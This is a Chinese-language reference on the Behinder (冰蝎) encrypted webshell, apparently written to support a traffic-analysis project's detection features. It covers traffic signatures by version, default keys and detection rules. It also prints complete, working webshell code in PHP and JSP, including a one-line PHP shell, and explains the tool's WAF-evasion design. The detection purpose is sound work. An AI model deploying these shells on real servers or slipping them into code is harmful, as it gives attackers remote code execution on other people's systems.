# 冰蝎 (Behinder) WebShell 技术分析参考

> 基于 meow~traffic 项目的 WebShell 检测功能，整理的冰蝎技术资料。

## 1. 冰蝎概述

冰蝎 (Behinder) 是一款动态二进制加密网站管理客户端，使用 Java 开发，支持 PHP、JSP、ASP、.NET 等多种服务端语言。其核心特点是使用对称加密算法在 HTTP 明文协议中建立加密隧道，以躲避传统安全设备检测。

**仓库**：[github.com/rebeyond/Behinder](https://github.com/rebeyond/Behinder)（6.2K★）  
**最新版本**：v4.1（t00ls 专版）  
**运行环境**：客户端 JRE 8+，服务端 .NET 2.0+ / PHP 5.3-7.4 / Java 6+

---

## 2. 各版本传输协议详解

### 2.1 V1.0 — 固定特征版

**密钥机制**：固定密钥  
**主要特征**：
- `User-Agent` 固定为 `Java/1.8.0_211`
- URL 包含 `.php?pass=`
- 返回包 `Transfer-Encoding: chunked`
- 请求包 `Content-Type: application/octet-stream`

**检测难度**：容易

### 2.2 V2.0 — 动态密钥协商版

**密钥机制**：动态密钥协商（两次 GET 请求）  
**通信流程**：

```
阶段 1：密钥协商
  ① 客户端 GET /shell.php?pass=645 → 服务端产生密钥写入 $_SESSION，返回 16 位密钥
  ② 客户端 GET /shell.php?pass=123 → 服务端返回 AES 加密密钥

阶段 2：加密传输
  ① 客户端用 AES128 或 XOR 加密 payload，POST 发送
  ② 服务端解密执行，结果 AES 加密返回
```

**密钥生成**：
- 服务端使用随机数 MD5 的高 16 位作为密钥
- 密钥存储在 `$_SESSION` 变量中
- 密钥格式：`[a-f0-9]{16}`

**WebShell 结构**（PHP）：
```php
<?php
@error_reporting(0);
session_start();
if (isset($_REQUEST['pass'])) {
    $key = substr(md5(uniqid(rand())), 16);  // 随机数 MD5 高 16 位
    $_SESSION['k'] = $key;
    echo $key;
} else {
    $key = $_SESSION['k'];
    $post = file_get_contents("php://input");
    if (!extension_loaded('openssl')) {
        $post = base64_decode($post);
        for ($i = 0; $i < strlen($post); $i++) {
            $post[$i] = $post[$i] ^ $key[$i + 1 & 15];
        }
    } else {
        $post = openssl_decrypt($post, "AES128", $key);
    }
    $arr = explode('|', $post);
    $func = $arr[0];
    $params = $arr[1];
    // 动态调用函数...
}
?>
```

**固定特征**：
- URL 格式：`\.(php|jsp|asp|aspx)\?(\w){1,10}=\d{2,3}`
- 密钥响应体：`^[a-fA-F0-9]{16}$`
- POST 数据解密后有固定格式和长度

**可绕过特征**：
- `Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2`
- 内置 UA 库（较老版本 UA）
- `Connection: Keep-Alive`

**检测难度**：中等

### 2.3 V3.0 — 预共享密钥版

**密钥机制**：预共享密钥，取消动态协商  
**密钥生成**：
```
密钥 = md5("连接密码")[0:16]
默认密码 "rebeyond" → md5 → "E45E329FEB5D925BA3F549B17B4B3DDE" → 取前 16 位 → "e45e329feb5d925b"
```

**主要改进**：
- 去除动态密钥协商，省去两个 GET 请求
- 全程无明文交互
- 密钥写在 webshell 源码中

**WebShell 结构**（PHP）：
```php
<?php
@error_reporting(0);
session_start();
$key = "e45e329feb5d925b";  // 预共享密钥
$_SESSION['k'] = $key;
$post = file_get_contents("php://input");
if (!extension_loaded('openssl')) {
    $t = "base64_" . "decode";
    $post = $t($post . "");
    for ($i = 0; $i < strlen($post); $i++) {
        $post[$i] = $post[$i] ^ $key[$i + 1 & 15];
    }
} else {
    $post = openssl_decrypt($post, "AES128", $key);
}
$arr = explode('|', $post);
$func = $arr[0];
$params = $arr[1];
// 动态调用...
?>
```

**流量特征**：
- 第一个请求包 `Content-Length`：PHP=1112，JSP=8940，ASPX=7232
- Header 存在 `Pragma: no-cache`
- `Accept` 头固定值
- `Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7`
- UA 库扩展至 25 个
- Referer 中文件名纯大写或纯小写
- `Cache-Control: no-cache`

**检测方法**：
- 尝试用默认密钥解密 POST 数据
- 成功解密且包含敏感 PHP 函数则可判定

**检测难度**：较难

### 2.4 V4.0 — 自定义传输协议版

**核心变化**：开放传输协议自定义功能，实现流量加解密协议的去中心化。

**设计理念**：
> "v4.0 版本不再有连接密码的概念，你的自定义传输协议的算法就是连接密码。"

**工作流程**：
```
① 本地对 Payload 加密 → POST 发送至服务端
② 服务端解密 Payload
③ 服务端执行解密后的 Payload，获取执行结果
④ 服务端加密执行结果 → 返回客户端
⑤ 客户端解密响应
```

**传输协议结构**：
```java
// 本地协议（Java）
private byte[] Encrypt(byte[] data) throws Exception { ... }
private byte[] Decrypt(byte[] data) throws Exception { ... }

// 远程协议（PHP/C#/ASP）
function Encrypt($data) { ... }
function Decrypt($data) { ... }
```

**默认 AES 协议**：
```
算法：AES-128-ECB / PKCS5Padding
密钥：md5("连接密码")[0:16]
默认密钥："e45e329feb5d925b"（密码 "rebeyond"）
编码：Base64
```

**自定义协议示例 — AES with Magic Tail**：
```java
// 加密后在密文末尾追加随机字节
private byte[] getMagic() throws Exception {
    String key = "e45e329feb5d925b";
    int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
    Random random = new Random();
    byte[] buf = new byte[magicNum];
    for (int i = 0; i < buf.length; i++) {
        buf[i] = (byte) random.nextInt(256);
    }
    return buf;
}
```

**PHP 远程实现**：
```php
function Encrypt($data) {
    $key = "e45e329feb5d925b";
    $encrypted = base64_encode(openssl_encrypt($data, "AES-128-ECB", $key, OPENSSL_PKCS1_PADDING));
    $magicNum = hexdec(substr($key, 0, 2)) % 16;
    for ($i = 0; $i < $magicNum; $i++) {
        $encrypted = $encrypted . chr(mt_rand(0, 255));
    }
    return $encrypted;
}

function Decrypt($data) {
    $key = "e45e329feb5d925b";
    $magicNum = hexdec(substr($key, 0, 2)) % 16;
    $data = substr($data, 0, strlen($data) - $magicNum);
    return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key, OPENSSL_PKCS1_PADDING);
}
```

**流量特征**：
- 本地端口分布在 49700 左右，每建立新连接依次增加
- `Referer` 存在规律
- `Connection: Keep-Alive`
- `Content-Type`、`Accept`、`UA` 头
- UA 头缩减至 10 个
- 依旧存在默认密钥，可尝试解密

**检测难度**：困难

---

## 3. 各版本对比总结

| 版本 | 密钥机制 | 主要特征 | 检测难度 |
|------|----------|----------|----------|
| V1.0 | 固定 | Java UA、`.php?pass=`、chunked 编码 | 容易 |
| V2.0 | 动态协商 | 两次 GET 请求、16 位密钥、固定 URL 格式 | 中等 |
| V3.0 | 预共享密钥 | 默认密钥、固定 Accept 头、多 UA | 较难 |
| V4.0 | 多种算法 | 端口规律、精简 UA、自定义协议 | 困难 |

---

## 4. 检测方法

### 4.1 静态特征检测

**强特征（可单独使用）**：
- Accept 字段固定值
- User-Agent 命中内置 UA 库
- 密钥传递响应体：`[a-f0-9]{16}`

**弱特征（需组合使用）**：
- URL 参数格式
- Content-Type 固定值
- Connection: Keep-Alive
- Referer 规律
- Cache-Control: no-cache

### 4.2 动态行为检测

**密钥传递 + 加密通信关联**：
```
同一 URL 或源 IP 在数秒内同时命中：
- 密钥传递规则（GET 请求 + 16 位响应）
- 加密通讯规则（POST 请求 + Base64 编码）
```

**解密取证**：
```python
from Crypto.Cipher import AES
import base64

key = b"e45e329feb5d925b"  # 默认密钥
cipher = AES.new(key, AES.MODE_ECB)

# 解密 POST 数据
encrypted = base64.b64decode(request_body)
decrypted = cipher.decrypt(encrypted)
# 检查是否包含敏感函数
```

### 4.3 机器学习检测

- 流量元数据特征提取
- 加密流量分类模型
- 行为序列分析

---

## 5. 与项目功能的关联

| 项目组件 | 冰蝎相关内容 |
|----------|-------------|
| `c2_decrypt.go` | WebShell 加密流量解密 |
| `stream_payload_sources.go` | 可疑 URI 扫描、命令执行检测 |
| `tool_c2.go` | C2 分析中的 WebShell 检测 |
| `c2_sample_analysis.go` | 冰蝎流量特征匹配 |

---

## 6. 参考资料

| 资源 | URL | 摘要 |
|------|-----|------|
| **冰蝎 v4.0 传输协议详解** | [微信公众号](https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A) | 作者官方文档，自定义传输协议开发指南 |
| **冰蝎各版本流量浅析** | [FreeBuf](https://www.freebuf.com/articles/web/351825.html) | V1.0-V4.0 完整流量特征分析 |
| **冰蝎 V4.0 流量分析到攻防检测** | [FreeBuf](https://www.freebuf.com/articles/sectool/355425.html) | V4.0 xor_base64 加密方式分析 |
| **冰蝎动态二进制加密 WebShell 的检测** | [绿盟博客](https://blog.nsfocus.net/hail-dynamic-binary-encryption-webshell-detection/) | V2.0 通信流程和 payload 分析 |
| **多种姿势检测冰蝎** | [腾讯云](https://cloud.tencent.com/developer/article/2483261) | 静态/动态检测方法 |
| **冰蝎 V3.0 Beta 2 分析** | [腾讯云](https://cloud.tencent.com.cn/developer/article/2483280) | V3.0 预共享密钥机制分析 |
| **Behinder GitHub** | [GitHub](https://github.com/rebeyond/Behinder) | 官方仓库，包含技术文档链接 |

### 冰蝎作者技术文档

| 文档 | URL | 内容 |
|------|-----|------|
| **客户端篇** | [先知社区](https://xz.aliyun.com/t/2799) | 动态二进制加密客户端功能介绍 |
| **Java 篇** | [先知社区](https://xz.aliyun.com/t/2744) | Java 版工作原理 |
| **.NET 篇** | [先知社区](https://xz.aliyun.com/t/2758) | .NET 版工作原理 |
| **PHP 篇** | [先知社区](https://xz.aliyun.com/t/2774) | PHP 版工作原理 |

---

## 7. 冰蝎原始技术文档（作者 rebeyond）

### 7.1 设计理念 — 为什么能一劳永逸绕过 WAF

**传统一句话木马的问题**：
1. 发送的请求是脚本源代码，基于文本，防御者能看懂
2. 多次执行相同操作，发送的请求数据相同，防御者可提取特征固化规则

**冰蝎的解决方案**：
- 发送的不是文本格式源代码，而是编译后的字节码（如 Java 的 class 二进制文件）
- 字节码是一堆二进制数据流，不存在参数
- 对二进制字节码进行加密，防御者看到的是一堆加密的二进制数据流
- 多次执行同样操作，采用不同密钥加密，即使是同样的 payload，请求数据也不一样

**核心流程**：
```
① 客户端 GET 请求 → 服务端随机产生 128 位密钥，回显给客户端，写入 Session
② 客户端用 AES 加密本地二进制 payload → POST 发送至服务端
③ 服务端从 Session 取出密钥 → AES 解密 → 得到二进制 payload
④ 服务端解析二进制 payload → 执行任意代码 → 加密返回结果
⑤ 客户端解密执行结果
```

### 7.2 Java 版实现细节

**关键技术 — 动态解析 class 字节流**：

Java 没有直接解析 class 字节数组的接口，但 ClassLoader 内部有 protected 的 `defineClass` 方法。通过自定义 ClassLoader 子类调用父类的 `defineClass`：

```java
public static class Myloader extends ClassLoader {
    public Myloader(ClassLoader c) { super(c); }
    public Class get(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }
}
```

**Payload 设计**：
- Payload 类继承 Object，重写 `equals(Object obj)` 方法
- `equals` 方法有入参且入参是 Object 类，可传递任何类型对象
- 传递 `pageContext` 进去，可间接获取 Request、Response、Session 等对象
- 需要复写 ClassLoader 构造函数传递指定 ClassLoader 实例（解决 ClassNotFoundException）

**JSP 完整代码（611 字节）**：
```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if(request.getParameter("pass")!=null){
String k=(""+UUID.randomUUID()).replace("-","").substring(16);
session.putValue("u",k);out.print(k);return;}
Cipher c=Cipher.getInstance("AES");c.init(2,
new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
new U(this.getClass().getClassLoader()).g(c.doFinal(
new sun.misc.BASE64Decoder().decodeBuffer(
request.getReader().readLine()))).newInstance().equals(pageContext);%>
```

**客户端参数化（ASM 框架）**：
- 使用 ASM 框架动态修改 class 文件中的属性值
- 在发送 class 字节流之前，先对 class 进行参数化
- 不需要重新编译即可向 class 文件注入自定义参数

### 7.3 .NET 版实现细节

**关键技术 — Assembly.Load**：

.NET 中使用 `System.Reflection.Assembly.Load(byte[])` 加载 DLL 字节数组：

```csharp
Assembly myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
Object myPaylaod = myAssebly.CreateInstance("Payload");
myPaylaod.Equals(this);  // 传递 Page 对象
```

**参数传递技巧**：
- `Assembly.Load` 解析时会自动忽略 COFF 文件尾部附加的额外数据
- 客户端把参数值拼接在 DLL 文件底部，一起 AES 加密
- 服务端解密后传入 `Assembly.Load`，自动忽略尾部参数
- Payload 的 `Equals` 方法中再次解密完整字节流，取出尾部参数

**参数提取代码**：
```csharp
private void fillParams() {
    byte[] fullData = Request.BinaryRead(Request.ContentLength);
    byte[] key = Encoding.Default.GetBytes(Session[0] + "");
    fullData = new RijndaelManaged().CreateDecryptor(key, key)
        .TransformFinalBlock(fullData, 0, fullData.Length);
    Dictionary<string, object> extraMap = getExtraData(fullData);
    foreach (var f in extraMap) {
        this.GetType().GetField(f.Key).SetValue(this, f.Value);
    }
}
```

### 7.4 PHP 版实现细节

**关键技术 — 可变函数**：

PHP 不存在编译中间环节，使用"可变函数"概念：

```php
<?php
session_start();
if (isset($_GET['pass'])) {
    $key = substr(md5(uniqid(rand())), 16);
    $_SESSION['k'] = $key;
    print $key;
} else {
    $key = $_SESSION['k'];
    $decrptContent = openssl_decrypt(file_get_contents("php://input"), "AES128", $key);
    $arr = explode('|', $decrptContent);
    $func = $arr[0];      // 如 "assert"
    $params = $arr[1];    // 如 "eval('phpinfo();')"
    $func($params);       // 可变函数调用
}
?>
```

**压缩版（单行）**：
```php
<?php session_start();isset($_GET['pass'])?print $_SESSION['k']=substr(md5(uniqid(rand())),16):
($b=explode('|',openssl_decrypt(file_get_contents("php://input"),"AES128",$_SESSION['k'])))&$b[0]($b[1]);?>
```

**Payload 格式约定**：
```
function main(arg1, arg2, ...) { ... }
main(arg1, arg2, ...);
```

客户端自动实现参数填充：
```java
public static byte[] getParamedPhp(String clsName, Map<String, String> params) {
    // 读取 Payload 源代码
    // 追加参数赋值: $paramName="paramValue";
    // 追加调用: main($param1, $param2, ...);
    return code.toString().getBytes();
}
```

### 7.5 客户端功能

| 功能 | 说明 |
|------|------|
| **基本信息** | 服务器环境变量、系统属性、phpinfo |
| **文件管理** | 增删改查，加密传输 |
| **命令执行** | 单条操作系统命令 |
| **虚拟终端** | 交互式 Shell（ssh、mysql、powershell） |
| **Socks 代理** | 基于一句话木马的 Socks 代理，流量封装 AES |
| **反弹 Shell** | 常规 Shell 和 Meterpreter，对接 metasploit |
| **数据库管理** | 自动上传并加载数据库驱动 |
| **自定义代码** | 执行任意 Java/PHP/C# 代码，加密传输 |
| **备忘录** | 每个 Shell 独立的文本备忘录 |

### 7.6 检测要点总结

**Java 版检测**：
- `defineClass` 调用链
- `ClassLoader` 子类实例化
- `equals(pageContext)` 调用模式
- AES/ECB/PKCS5Padding 加密后 Base64 编码的 POST body

**.NET 版检测**：
- `Assembly.Load` 调用
- `CreateInstance` + `Equals(this)` 模式
- DLL 文件尾部附加参数的结构特征

**PHP 版检测**：
- `explode('|', ...)` 分割模式
- 可变函数调用 `$func($params)`
- `openssl_decrypt` + `file_get_contents("php://input")`

**通用检测**：
- GET 请求获取密钥 + POST 请求加密数据的两阶段模式
- Session 中存储 16 位密钥
- POST body 为 Base64 编码的加密二进制数据
